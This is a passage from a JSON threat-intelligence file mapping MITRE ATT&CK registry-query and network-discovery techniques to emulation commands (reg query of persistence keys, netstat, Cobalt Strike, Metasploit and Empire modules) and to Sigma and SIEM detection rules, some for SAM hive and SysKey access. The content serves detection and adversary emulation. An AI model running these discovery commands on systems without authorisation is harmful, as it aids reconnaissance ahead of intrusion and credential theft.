if it's 0, then terminal services are enabled. If it's 1, then they're disabled", "Metasploit": "reg queryval -k \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections\npost/windows/gather/enum_termserv"}}, {"Atomic Red Team Test - Query Registry": {"display_name": "Query Registry", "atomic_tests": [{"description": "Query Windows Registry\nReferences:\n\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\n\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\n\nReferences:\n\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\n\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n", "supported_platforms": ["windows"], "name": "Query Registry", "executor": {"elevation_required": true, "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n", "name": "command_prompt"}}], "attack_technique": "T1012"}}, {"Mitre Stockpile - Query Registry using PowerShell Get-ItemProperty": {"platforms": {"windows": {"psh": {"command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"}}}, "description": "Query Registry using PowerShell Get-ItemProperty", "tactic": "discovery", "technique": {"attack_id": "T1012", "name": "Query Registry"}, "id": "2488245e-bcbd-405d-920e-2de27db882b3", "name": "Query Registry"}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100148", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100149", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100150", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100151", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100152", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100153", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100154", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100155", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100156", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100157", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100158", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100159", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100160", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100161", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100162", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100163", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1012", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100164", "registry_value": "", "mitre_caption": "query_registry", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "frequency": "high", "commandline_string": "reg (query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1012", "Empire Module": "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "Technique": "Query Registry", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_cached_rdpconnection\":  [\"T1012\"],"}}], "queries": [{"query": "Sysmon| where EventID == 3 and process_path contains \"reg.exe\" and process_command_line contains \"reg query\"", "product": "Azure Sentinel", "name": "Query Registry Network"}, {"query": "Sysmon| where EventID == 1 and process_path contains \"reg.exe\" and process_command_line contains \"reg query\"", "product": "Azure Sentinel", "name": "Query Registry Process"}, {"query": "title: Remote registry management using REG utility\nid: 68fcba0d-73a5-475e-a915-e8b4c576827e\ndescription: Remote registry management using REG utility from non-admin workstation\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/13\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.defense_evasion\n    - attack.discovery\n    - attack.t1112\n    - attack.t1012\n    - attack.s0075\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection_1:\n        EventID: 5145\n        RelativeTargetName|contains: '\\winreg'\n    selection_2:\n        IpAddress: '%Admins_Workstations%'\n    condition: selection_1 and not selection_2\nfalsepositives:\n    - Legitimate usage of remote registry management by administrator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Remote registry management using REG utility\nid: 68fcba0d-73a5-475e-a915-e8b4c576827e\ndescription: Remote registry management using REG utility from non-admin workstation\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/13\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.defense_evasion\n    - attack.discovery\n    - attack.t1112\n    - attack.t1012\n    - attack.s0075\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection_1:\n        EventID: 5145\n        RelativeTargetName|contains: '\\winreg'\n    selection_2:\n        IpAddress: '%Admins_Workstations%'\n    condition: selection_1 and not selection_2\nfalsepositives:\n    - Legitimate usage of remote registry management by administrator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"5145\" AND RelativeTargetName.keyword:*\\\\\\\\winreg*) AND (NOT (IpAddress:\"%Admins_Workstations%\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Remote-registry-management-using-REG-utility <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Remote registry management using REG utility\",\\n    \"description\": \"Remote registry management using REG utility from non-admin workstation\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.discovery\",\\n      \"attack.t1112\",\\n      \"attack.t1012\",\\n      \"attack.s0075\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"5145\\\\\" AND RelativeTargetName.keyword:*\\\\\\\\\\\\\\\\winreg*) AND (NOT (IpAddress:\\\\\"%Admins_Workstations%\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"5145\\\\\" AND RelativeTargetName.keyword:*\\\\\\\\\\\\\\\\winreg*) AND (NOT (IpAddress:\\\\\"%Admins_Workstations%\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Remote registry management using REG utility\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"5145\" AND RelativeTargetName.keyword:*\\\\\\\\winreg*) AND (NOT (IpAddress:\"%Admins_Workstations%\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"5145\" RelativeTargetName=\"*\\\\\\\\winreg*\") NOT (IpAddress=\"%Admins_Workstations%\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"5145\" RelativeTargetName=\"*\\\\\\\\winreg*\")  -(IpAddress=\"%Admins_Workstations%\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*5145)(?=.*.*\\\\winreg.*)))(?=.*(?!.*(?:.*(?=.*%Admins_Workstations%)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1012 SAM Registry Hive Handle Request\nid: f8748f2c-89dc-4d95-afb0-5a2dfdbad332\ndescription: Detects handles requested to SAM registry hive\nstatus: experimental\ndate: 2019/08/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/07_discovery/T1012_query_registry/sam_registry_hive_access.md\ntags:\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4656\n        ObjectType: 'Key'\n        ObjectName|endswith: '\\SAM'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: T1012 SAM Registry Hive Handle Request\nid: f8748f2c-89dc-4d95-afb0-5a2dfdbad332\ndescription: Detects handles requested to SAM registry hive\nstatus: experimental\ndate: 2019/08/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/07_discovery/T1012_query_registry/sam_registry_hive_access.md\ntags:\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4656\n        ObjectType: 'Key'\n        ObjectName|endswith: '\\SAM'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4656\" AND ObjectType:\"Key\" AND ObjectName.keyword:*\\\\\\\\SAM)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1012-SAM-Registry-Hive-Handle-Request <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1012 SAM Registry Hive Handle Request\",\\n    \"description\": \"Detects handles requested to SAM registry hive\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1012\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4656\\\\\" AND ObjectType:\\\\\"Key\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\SAM)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4656\\\\\" AND ObjectType:\\\\\"Key\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\SAM)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1012 SAM Registry Hive Handle Request\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4656\" AND ObjectType:\"Key\" AND ObjectName.keyword:*\\\\\\\\SAM)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4656\" ObjectType=\"Key\" ObjectName=\"*\\\\\\\\SAM\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4656\" ObjectType=\"Key\" ObjectName=\"*\\\\\\\\SAM\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4656)(?=.*Key)(?=.*.*\\\\SAM))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1012 SysKey Registry Keys Access\nid: 9a4ff3b8-6187-4fd2-8e8b-e0eae1129495\ndescription: Detects handle requests and access operations to specific registry keys to calculate the SysKey\nstatus: experimental\ndate: 2019/08/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/playbooks/windows/07_discovery/T1012_query_registry/syskey_registry_keys_access.md\ntags:\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4656\n            - 4663\n        ObjectType: 'key'\n        ObjectName|endswith:\n            - 'lsa\\JD'\n            - 'lsa\\GBG'\n            - 'lsa\\Skew1'\n            - 'lsa\\Data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: T1012 SysKey Registry Keys Access\nid: 9a4ff3b8-6187-4fd2-8e8b-e0eae1129495\ndescription: Detects handle requests and access operations to specific registry keys to calculate the SysKey\nstatus: experimental\ndate: 2019/08/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/playbooks/windows/07_discovery/T1012_query_registry/syskey_registry_keys_access.md\ntags:\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4656\n            - 4663\n        ObjectType: 'key'\n        ObjectName|endswith:\n            - 'lsa\\JD'\n            - 'lsa\\GBG'\n            - 'lsa\\Skew1'\n            - 'lsa\\Data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"4656\" OR \"4663\") AND ObjectType:\"key\" AND ObjectName.keyword:(*lsa\\\\\\\\JD OR *lsa\\\\\\\\GBG OR *lsa\\\\\\\\Skew1 OR *lsa\\\\\\\\Data))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1012-SysKey-Registry-Keys-Access <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1012 SysKey Registry Keys Access\",\\n    \"description\": \"Detects handle requests and access operations to specific registry keys to calculate the SysKey\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1012\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"4656\\\\\" OR \\\\\"4663\\\\\") AND ObjectType:\\\\\"key\\\\\" AND ObjectName.keyword:(*lsa\\\\\\\\\\\\\\\\JD OR *lsa\\\\\\\\\\\\\\\\GBG OR *lsa\\\\\\\\\\\\\\\\Skew1 OR *lsa\\\\\\\\\\\\\\\\Data))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4656\\\\\" OR \\\\\"4663\\\\\") AND ObjectType:\\\\\"key\\\\\" AND ObjectName.keyword:(*lsa\\\\\\\\\\\\\\\\JD OR *lsa\\\\\\\\\\\\\\\\GBG OR *lsa\\\\\\\\\\\\\\\\Skew1 OR *lsa\\\\\\\\\\\\\\\\Data))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1012 SysKey Registry Keys Access\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4656\" \"4663\") AND ObjectType:\"key\" AND ObjectName.keyword:(*lsa\\\\\\\\JD *lsa\\\\\\\\GBG *lsa\\\\\\\\Skew1 *lsa\\\\\\\\Data))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4656\" OR EventID=\"4663\") ObjectType=\"key\" (ObjectName=\"*lsa\\\\\\\\JD\" OR ObjectName=\"*lsa\\\\\\\\GBG\" OR ObjectName=\"*lsa\\\\\\\\Skew1\" OR ObjectName=\"*lsa\\\\\\\\Data\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"4656\", \"4663\"] ObjectType=\"key\" ObjectName IN [\"*lsa\\\\\\\\JD\", \"*lsa\\\\\\\\GBG\", \"*lsa\\\\\\\\Skew1\", \"*lsa\\\\\\\\Data\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4656|.*4663))(?=.*key)(?=.*(?:.*.*lsa\\\\JD|.*.*lsa\\\\GBG|.*.*lsa\\\\Skew1|.*.*lsa\\\\Data)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: windows executed locally reg query HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Terminal Server Client \\ Default\ndescription: windows server 2016\nreferences: No\ntags: T1012\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ reg.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: reg query * / ve # Process Information> process command line, practice, you can detect any registry query behavior\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "netstat -ano[b] ", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell c:\\windows\\sysnative\\netstat.exe -ano[b]", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/tcpnetstat", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net session | find / \"\\\\\"", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net session | find / \"\\\\\"", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/enum_logged_on_users", "name": "Metasploit"}, {"source": "atomics/T1049/T1049.yaml", "command": "netstat\nnet use\nnet sessions\n", "name": null}, {"source": "atomics/T1049/T1049.yaml", "command": "Get-NetTCPConnection\n", "name": null}, {"source": "atomics/T1049/T1049.yaml", "command": "netstat\nwho -a\n", "name": null}, {"source": "data/abilities/discovery/613e0ffb-e6e8-4e86-b35d-10edd232679d.yml", "command": {"windows": {"psh": {"command": "netstat -ano;\nGet-NetTCPConnection"}}}, "name": "Enumerates network connections"}, {"source": "data/abilities/discovery/638fb6bb-ba39-4285-93d1-7e4775b033a8.yml", "command": {"windows": {"psh": {"command": "Get-NetTCPConnection\n"}}, "darwin": {"sh": {"command": "netstat -ant\n"}}, "linux": {"sh": {"command": "netstat -ant\n"}}}, "name": "Find System Network Connections"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/monitortcpconnections", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/monitortcpconnections", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_rdp_session", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_rdp_session", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> netstat\n\nActive connections\n\nProtocol local address external address status", "name": "Dos"}, {"source": 